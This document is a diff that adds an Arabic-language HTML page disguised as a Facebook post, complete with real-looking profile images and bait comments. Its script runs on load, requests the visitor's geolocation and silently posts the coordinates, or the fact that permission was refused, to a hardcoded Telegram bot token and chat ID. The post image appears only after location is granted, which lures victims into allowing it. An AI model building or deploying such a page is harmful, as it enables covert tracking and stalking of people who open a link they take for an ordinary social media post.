@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Post Page</title>
+    <style>
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px;
+        }
+
+        .navbar .back-button,
+        .navbar .search-icon {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
+
+        .navbar .account-name {
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .container {
+            max-width: 600px;
+            min-height: 100vh;
+            margin: auto;
+            padding: 10px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .post {
+            margin-bottom: 20px;
+        }
+
+        .post-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .profile-pic {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-left: 10px;
+        }
+
+        .user-info {
+            font-size: 14px;
+        }
+
+        .user-info .name {
+            font-weight: bold;
+        }
+
+        .user-info .time {
+            color: #666;
+            font-size: 12px;
+        }
+
+        .post-content {
+            margin-bottom: 10px;
+        }
+
+        .post-image {
+            width: 100%;
+            border-radius: 8px;
+        }
+
+        .post-interactions {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding: 10px 0;
+            border-top: 1px solid #ddd;
+        }
+
+        .interaction-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            color: #555;
+            cursor: pointer;
+        }
+
+        .interaction-button img {
+            width: 21px;
+            height: 21px;
+            margin-left: 5px;
+        }
+
+        .comments {
+            margin-top: 15px;
+            padding-top: 10px;
+            border-top: 1px solid #ddd;
+        }
+
+        .comment {
+            display: flex;
+            margin-bottom: 12px;
+        }
+        
+        .comment img {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            margin-left: 10px;
+        }
+
+        .commenter-name {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .comment-content {
+            font-size: 14px;
+            background-color: #f0f0f0;
+            padding: 5px 8px;
+            border-radius: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+
+            .profile-pic {
+                margin-bottom: 5px;
+            }
+
+            /* .post-interactions {
+                align-items: flex-start;
+            } */
+        }
+    </style>
+</head>
+<body dir="rtl">
+    <div class="container">
+        <div class="navbar">
+            <img src="back-icon.png" alt="Back" class="back-button">
+            <div class="account-name">Nada Ahmed</div>
+            <img src="edit-icon.png" alt="Search" class="search-icon">
+        </div>
+        <div class="post">
+            <div class="post-header">
+                <img src="https://scontent.fcai20-5.fna.fbcdn.net/v/t39.30808-1/442478071_892475366257313_3083922360058589355_n.jpg?stp=dst-jpg_s200x200_tt6&_nc_cat=1&ccb=1-7&_nc_sid=2d3e12&_nc_ohc=6mtyil38GfoQ7kNvgH6hP2_&_nc_oc=AdhAXMcfH852DL86GwSl1xb8jnvw1bSzF5iqpZExs0ip0fbMndHr4AmkidzyCyuXalk&_nc_zt=24&_nc_ht=scontent.fcai20-5.fna&_nc_gid=A8G00u9uHQKWZPMaBdUtz54&oh=00_AYBFm_qVt9fakO4ZEvW9m75Ui6iS3_lBQq46Qu2F0PxZ5w&oe=677A208C" alt="User Profile" class="profile-pic">
+                <div class="user-info">
+                    <div class="name">Nada Ahmed</div>
+                    <div class="time">2 س</div>
+                </div>
+            </div>
+            <div class="post-content" dir="rtl">
+                فعلا شكلك مدي على حرامي..
+            </div>
+            <img src="loading.png" alt="Post Image" class="post-image">
+            <div class="post-interactions">
+                <div class="interaction-button">
+                    <img src="like-icon.png" alt="Like"> أعجبني
+                </div>
+                <div class="interaction-button">
+                    <img src="comment-icon.png" alt="Comment"> تعليق
+                </div>
+                <div class="interaction-button">
+                    <img src="share-icon.png" alt="Share"> مشاركة
+                </div>
+            </div>
+            <div class="comments">
+                <div class="comment">
+                    <img src="https://scontent.fcai20-3.fna.fbcdn.net/v/t39.30808-6/471762548_576935958288287_985916693273693321_n.jpg?_nc_cat=111&ccb=1-7&_nc_sid=aa7b47&_nc_ohc=sVFpAWG-N3kQ7kNvgHN-uJ1&_nc_oc=AdiK0U7MGmOi9lonFBv13Rrw4VBCOfmBfplDWT_fBj6ZkeSCtyTvzG6r077YCavaP18&_nc_zt=23&_nc_ht=scontent.fcai20-3.fna&_nc_gid=AYcY6Ndu01ujuUcYsre2dmP&oh=00_AYBcm7BMJrCCYG58keCMzd5iuERzMP8dL10Hc2ixe9dW8A&oe=677A1670" alt="Commenter Profile">
+                    <div class="comment-content"><div class="commenter-name">الفــنان</div>متعوضه متعوضه</div>
+                </div>
+                <div class="comment">
+                    <img src="https://scontent.fcai20-1.fna.fbcdn.net/v/t39.30808-6/471583917_449218101574380_1605011321136180602_n.jpg?stp=dst-jpg_p526x296_tt6&_nc_cat=108&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=r2a-9WN2k-UQ7kNvgEwPlGf&_nc_oc=AdhAiawkhJwVQw7EMxdc01ibVVy62vcVBR_1_u87B4Uh-JAZ1UdXzjzT5SfJ1F1FEKo&_nc_zt=23&_nc_ht=scontent.fcai20-1.fna&_nc_gid=At_l3Fde5b0wg5Re76XjHRY&oh=00_AYCHmGQL-ghLDCCcD338SjQ2iloKDPT7xSjbJt8wIYX3UA&oe=677A156F" alt="Commenter Profile">
+                    <div class="comment-content"><div class="commenter-name">ابـن السيد</div>دا منين دا؟</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        const postImage = document.querySelector(".post-image")
+        window.onload = function() {
+            getLocation();
+        };
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition, showError);
+            } else {
+                sendMessage("المتصفح لا يدعم تحديد الموقع")
+            }
+        }
+
+        function sendPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            const message = `Location: Latitude: ${latitude}, Longitude: ${longitude}`;
+            sendMessage(message);
+            postImage.setAttribute("src", "post.png")
+        }
+
+        function sendMessage(message) {
+            const telegramToken = '6893297008:AAEiXcfNjUXC6Lz4Oz4D7Xegp7DvQP5U65A';
+            const chatId = '5451878368';
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            }).then(response => response.json())
+              .then(data => console.log('Success:', data))
+              .catch(error => console.error('Error:', error));
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    sendMessage("المستخدم رفض طلب تحديد الموقع.");
+                    postImage.setAttribute("src", "non-post.png")
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    sendMessage("المعلومات الجغرافية غير متوفرة.");
+                    break;
+                case error.TIMEOUT:
+                    sendMessage("طلب تحديد الموقع تجاوز الوقت المسموح.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    sendMessage("حدث خطأ غير معروف.");
+                    break;
+            }
+        }
+    </script>
+</body>
+</html>
